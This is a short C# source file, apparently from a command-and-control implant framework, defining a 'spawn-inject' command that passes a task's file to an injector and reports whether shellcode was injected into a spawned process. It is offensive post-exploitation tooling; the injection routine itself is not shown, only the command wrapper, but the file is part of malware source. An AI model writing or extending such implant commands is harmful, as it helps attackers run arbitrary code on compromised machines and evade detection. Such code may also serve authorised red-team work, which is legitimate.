using SharedArsenal.Internal;
using Knight.Models.Raven;

namespace Knight.Commands
{
    public class ShellcodeSpawnInject : KnightCommand
    {
        public override string Name => "spawn-inject";

        public override string Execute(TaskMessage task)
        {
            var injector = new SpawnInject();
            //var success = injector.Inject(task.FileBytes);
            var success = injector.Inject(task.File);

            if (success)
            {
                return "Shellcode injected";
            }
            else
            {
                return "Failed to inject";
            }
        }
    }
}